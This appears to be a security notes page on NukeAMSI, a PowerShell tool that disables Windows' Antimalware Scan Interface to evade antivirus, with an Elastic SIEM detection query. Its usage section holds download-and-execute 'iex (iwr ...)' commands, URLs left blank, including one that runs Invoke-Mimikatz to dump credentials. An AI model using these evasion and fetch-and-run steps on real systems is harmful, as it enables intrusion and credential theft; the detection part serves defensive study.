---
title: amsi-bypass
tags: [evasion, type/tool, phase/evasion, phase/detection, platform/windows]
---

# AMSI Bypass

## Introduction

NukeAMSI is a powerful tool designed to neutralize the Antimalware Scan Interface (AMSI) in Windows environments. Developed for educational purposes, this script enables users to disable AMSI protections within the current PowerShell session, allowing for the execution of scripts that would typically be flagged or blocked by Windows Defender and other antivirus solutions.

## Features

* _**Direct Memory Manipulation**_**:** NukeAMSI utilizes direct memory manipulation techniques to disable AMSI, leveraging the ntdll library and other critical Windows APIs. This ensures that AMSI is effectively bypassed without raising alerts or triggering additional security measures.
* _**Stealth Operations**_**:** The tool operates in-memory, meaning it leaves no trace on disk. This makes it particularly useful in scenarios where maintaining operational security is paramount.
* _**Highly Effective Bypass**_**:** Unlike traditional AMSI bypass techniques that may involve patching specific functions, NukeAMSI attacks AMSI at a deeper level. By leveraging ntdll, it targets the heart of AMSI's detection mechanisms, ensuring a higher success rate even against updated antivirus engines.

## Practical

### Downloading the Script

```
git clone 
```

### Executing the Script on Windows Host

```
iex (iwr "
```

### Executing Mimikatz

```
iex (iwr "
```

```
Invoke-Mimikatz
```

## Detection

### Elastic SIEM Query

```
event.code(800 OR 4103 OR 4104) AND "VirtualProtectEX" OR "NukeAMSI"
```

***

## REFERENCES

* 
* 
* 
* 
* 
